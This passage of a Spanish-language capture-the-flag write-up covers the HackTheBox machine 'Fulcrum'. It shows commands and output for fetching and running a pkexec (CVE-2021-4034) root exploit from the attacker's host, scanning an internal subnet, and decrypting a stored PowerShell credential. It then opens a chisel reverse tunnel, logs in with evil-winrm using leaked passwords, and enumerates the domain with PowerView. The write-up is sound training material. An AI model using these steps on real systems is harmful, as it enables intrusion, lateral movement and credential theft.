10.10.10.62 192.168.122.1 dead:beef::250:56ff:feb0:aa3b
</code></pre></div></div>

<ul>
  <li>Vemos el <strong>pkexec</strong> que es SUID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> snap
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
www-data@fulcrum:/<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Como hay otra interfaz vamos a tener que hacer pivoting entonces es mejor estar como root así que vamos a explotar el <code class="language-plaintext highlighter-rouge">pkexec</code> <a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
<span class="nt">--2024-06-14</span> 20:54:25--  http://10.10.14.62/CVE-2021-4034.py
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 404 File not found
2024-06-14 20:54:25 ERROR 404: File not found.

www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
<span class="nt">--2024-06-14</span> 20:55:08--  http://10.10.14.62/CVE-2021-4034.py
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 <span class="o">(</span>3.2K<span class="o">)</span> <span class="o">[</span>text/x-python]
Saving to: <span class="s1">'CVE-2021-4034.py'</span>

CVE-2021-4034.py      0%[                    <span class="o">]</span>       0  <span class="nt">--</span>.-KB/s        CVE-2021-4034.py    100%[<span class="o">===================&gt;]</span>   3.19K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-06-14 20:55:08 <span class="o">(</span>273 MB/s<span class="o">)</span> - <span class="s1">'CVE-2021-4034.py'</span> saved <span class="o">[</span>3262/3262]

www-data@fulcrum:/tmp<span class="nv">$ </span>python3 CVE-2021-4034.py
<span class="o">[</span>+] Creating shared library <span class="k">for </span>exploit code.
<span class="o">[</span>+] Calling execve<span class="o">()</span>
<span class="c"># bash</span>
root@fulcrum:/tmp# <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
root@fulcrum:/tmp#
</code></pre></div></div>

<h2 id="shell-as-webuser">Shell as webuser</h2>

<ul>
  <li>Esta activa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.1 &amp;&gt;/dev/null
root@fulcrum:/tmp# <span class="nb">echo</span> <span class="nv">$?</span>
0
</code></pre></div></div>

<ul>
  <li>Vamos a escanear la interfaz hosts activas en ese segmento de red.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# <span class="nb">chmod</span> +x hostDiscovery.sh
root@fulcrum:/tmp# <span class="nb">cat </span>hostDiscovery.sh
<span class="c">#!/bin/bash</span>

<span class="k">function </span>ctrl_c<span class="o">(){</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span>
	tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
<span class="o">}</span>

<span class="c"># CTRL+C</span>
<span class="nb">trap </span>ctrl_c INT

tput civis
<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 192.168.122.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] host 192.168.122.</span><span class="nv">$i</span><span class="s2"> - ACTIVE"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span>tput cnorm
</code></pre></div></div>

<ul>
  <li>Vemos los hosts abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./hostDiscovery.sh
<span class="o">[</span>+] host 192.168.122.1 - ACTIVE
<span class="o">[</span>+] host 192.168.122.228 - ACTIVE
</code></pre></div></div>

<ul>
  <li>
    <p>Esta activo.</p>
  </li>
  <li>
    <p>Estamos ante una maquina Windows.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.228
PING 192.168.122.228 <span class="o">(</span>192.168.122.228<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.122.228: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>128 <span class="nb">time</span><span class="o">=</span>0.360 ms

<span class="nt">---</span> 192.168.122.228 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 0.360/0.360/0.360/0.000 ms
</code></pre></div></div>

<ul>
  <li>Ahora vamos a descubrir los puertos abiertos que tiene la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# nano portDiscovery.sh
root@fulcrum:/tmp# <span class="nb">cat </span>portDiscovery.sh
<span class="c">#!/bin/bash</span>

<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/192.168.122.228/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Port </span><span class="nv">$port</span><span class="s2"> - OPEN"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./portDiscovery.sh
<span class="o">[</span>+] Port 80 - OPEN
<span class="o">[</span>+] Port 5985 - OPEN
</code></pre></div></div>

<ul>
  <li>Si examinamos la ruta <strong>/uploads</strong> vemos un archivo con data interesante es un script en <code class="language-plaintext highlighter-rouge">powershell</code> que define la credencial de <code class="language-plaintext highlighter-rouge">webuser</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">cat </span>Fulcrum_Upload_to_Corp.ps1
<span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
<span class="c"># Password is now encrypted \o/</span>

<span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>
<span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>
<span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>
<span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>

Invoke-Command <span class="nt">-Computer</span> upload.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$5</span> <span class="nt">-File</span> Data.ps1
</code></pre></div></div>

<ul>
  <li>Encontramos un articulo donde nos dicen como podemos ver la contraseña en texto plano <a href="https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password">https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password</a> pero nos podemos guiar de ese articulo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ pwsh
PowerShell 7.2.6
Copyright <span class="o">(</span>c<span class="o">)</span> Microsoft Corporation.

https://aka.ms/powershell
Type <span class="s1">'help'</span> to get help.


┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a interpretarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$Ptr</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode<span class="o">(</span><span class="nv">$4</span><span class="o">)</span>

┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
└─PS&gt; <span class="nv">$4</span>
System.Security.SecureString
</code></pre></div></div>

<ul>
  <li>Y vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserName Password
<span class="nt">--------</span> <span class="nt">--------</span>
WebUser  M4ng£m£ntPa55
</code></pre></div></div>

<ul>
  <li>
    <p>El puerto del servicio de <code class="language-plaintext highlighter-rouge">evil-winrm</code> esta abierto a si que podemos conectarnos con ese usuario y esa contraseña pero necesitamos hacer un túnel para poder llegar a esa <code class="language-plaintext highlighter-rouge">IP</code> ya que no tenemos conectividad desde nuestra máquina.</p>
  </li>
  <li>
    <p>Haremos Remote Port Forwaring <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">gunzip </span>chisel_1.9.1_linux_amd64.gz
➜  content <span class="nb">ls
</span>chisel_1.9.1_linux_amd64  creds.txt
➜  content <span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlo a la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:10/chisel_1.9.1_linux_amd64
<span class="nt">--2024-06-14</span> 23:11:47--  http://10.10.14.62:10/chisel_1.9.1_linux_amd64
Connecting to 10.10.14.62:10... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 <span class="o">(</span>8.3M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: <span class="s1">'chisel_1.9.1_linux_amd64'</span>

chisel_1.9.1_linux_ 100%[<span class="o">===================&gt;]</span>   8.25M  2.93MB/s    <span class="k">in </span>2.8s

2024-06-14 23:11:50 <span class="o">(</span>2.93 MB/s<span class="o">)</span> - <span class="s1">'chisel_1.9.1_linux_amd64'</span> saved <span class="o">[</span>8654848/8654848]
www-data@fulcrum:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
</code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el chisel en nuestra máquina para estar en modo servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/06/14 17:13:45 server: Reverse tunnelling enabled
2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos en la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel_1.9.1_linux_amd64 client 10.10.14.62:1234 R:5985
2024/06/14 23:15:29 client: Connecting to ws://10.10.14.62:1234
2024/06/14 23:15:30 client: Connected <span class="o">(</span>Latency 112.623194ms<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la conexión.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/06/14 17:13:45 server: Reverse tunnelling enabled
2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
2024/06/14 17:15:29 server: session#1: tun: proxy#R:5985<span class="o">=&gt;</span>192.168.122.228:5985: Listening
</code></pre></div></div>

<h2 id="shell-as-btables">Shell as btables</h2>

<ul>
  <li>Ahora ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-i</span> 127.0.0.1 <span class="nt">-u</span> <span class="s1">'WebUser'</span> <span class="nt">-p</span> <span class="s1">'M4ng£m£ntPa55'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\W</span>ebUser<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>webserver<span class="se">\w</span>ebuser
</code></pre></div></div>

<ul>
  <li>En la máquina victima hay una pagina web y en esta ruta encontramos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/8/2022   2:46 AM            703 iisstart.htm
<span class="nt">-a----</span>         5/8/2022   2:46 AM          99710 iisstart.png
<span class="nt">-a----</span>        2/12/2022  11:42 PM           5252 index.htm
<span class="nt">-a----</span>        2/12/2022  11:42 PM           1280 web.config


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">type </span>web.config
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;configuration <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/.NetConfiguration/v2.0"</span><span class="o">&gt;</span>
    &lt;appSettings /&gt;
    &lt;connectionStrings&gt;
        &lt;add <span class="nv">connectionString</span><span class="o">=</span><span class="s2">"LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"ADServices"</span> /&gt;
    &lt;/connectionStrings&gt;
    &lt;system.web&gt;
        &lt;membership <span class="nv">defaultProvider</span><span class="o">=</span><span class="s2">"ADProvider"</span><span class="o">&gt;</span>
            &lt;providers&gt;
                &lt;add <span class="nv">name</span><span class="o">=</span><span class="s2">"ADProvider"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span> <span class="nv">connectionStringName</span><span class="o">=</span><span class="s2">"ADConnString"</span> <span class="nv">connectionUsername</span><span class="o">=</span><span class="s2">"FULCRUM</span><span class="se">\L</span><span class="s2">DAP"</span> <span class="nv">connectionPassword</span><span class="o">=</span><span class="s2">"PasswordForSearching123!"</span> <span class="nv">attributeMapUsername</span><span class="o">=</span><span class="s2">"SAMAccountName"</span> /&gt;
            &lt;/providers&gt;
        &lt;/membership&gt;
    &lt;/system.web&gt;
&lt;system.webServer&gt;
   &lt;httpProtocol&gt;
      &lt;customHeaders&gt;
           &lt;clear /&gt;
      &lt;/customHeaders&gt;
   &lt;/httpProtocol&gt;
        &lt;defaultDocument&gt;
            &lt;files&gt;
                &lt;clear /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.asp"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.htm"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.htm"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.html"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"iisstart.htm"</span> /&gt;
            &lt;/files&gt;
        &lt;/defaultDocument&gt;
&lt;/system.webServer&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<ul>
  <li>Ese es el <code class="language-plaintext highlighter-rouge">domain controller</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; ping dc.fulcrum.local

Pinging dc.fulcrum.local <span class="o">[</span>192.168.122.130] with 32 bytes of data:
Request timed out.
</code></pre></div></div>

<ul>
  <li>Tenemos una credencial a nivel de dominio vamos a enumerar el dominio para eso usaremos el siguiente recurso <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt;  <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Privesc


    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/15/2024  12:48 AM                Privesc


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Privesc
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; upload /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1 to C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\P</span>owerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a importar el modulo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owerView.ps1
</code></pre></div></div>

<ul>
  <li>Ahora definimos todo como no lo dicen en el script de PowerView.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'PasswordForSearching123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\LDAP'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a listar todos los usuario del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span>


logoncount             : 6
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account <span class="k">for </span>administering the computer/domain
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp     : 5/7/2022 11:56:07 PM
name                   : Administrator
objectsid              : S-1-5-21-1158016984-652700382-3033952538-500
samaccountname         : Administrator
logonhours             : <span class="o">{</span>255, 255, 255, 255...<span class="o">}</span>
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 5/8/2022 8:14:22 AM
instancetype           : 4
objectguid             : 73409563-3e6c-4ac9-9bd8-a804c6519ead
lastlogon              : 5/8/2022 1:49:11 AM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 6:12:16 PM<span class="o">}</span>
memberof               : <span class="o">{</span><span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span>local...<span class="o">}</span>
whencreated            : 5/8/2022 6:52:43 AM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 5/8/2022 1:14:22 AM
usnchanged             : 12848

pwdlastset             : 12/31/1600 4:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account <span class="k">for </span>guest access to the computer/domain
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Guest,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                   : Guest
objectsid              : S-1-5-21-1158016984-652700382-3033952538-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 5/8/2022 6:52:43 AM
instancetype           : 4
objectguid             : 07e39362-1d6b-4f14-939a-75a5cc85d91d
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 6:55:22 AM, 1/1/1601 12:00:01 AM<span class="o">}</span>
memberof               : <span class="nv">CN</span><span class="o">=</span>Guests,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>whencreated            : 5/8/2022 6:52:43 AM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass                   : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-1158016984-652700382-3033952538-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 5/8/2022 7:10:32 AM
instancetype                  : 4
objectguid                    : e6e5f620-8510-45f2-9ddc-0b36e43f55fd
lastlogon                     : 12/31/1600 4:00:00 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata         : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 12:04:16 AM<span class="o">}</span>
serviceprincipalname          : kadmin/changepw
memberof                      : <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>whencreated                   : 5/8/2022 6:55:21 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 5/7/2022 11:55:21 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 12831

company               : fulcrum
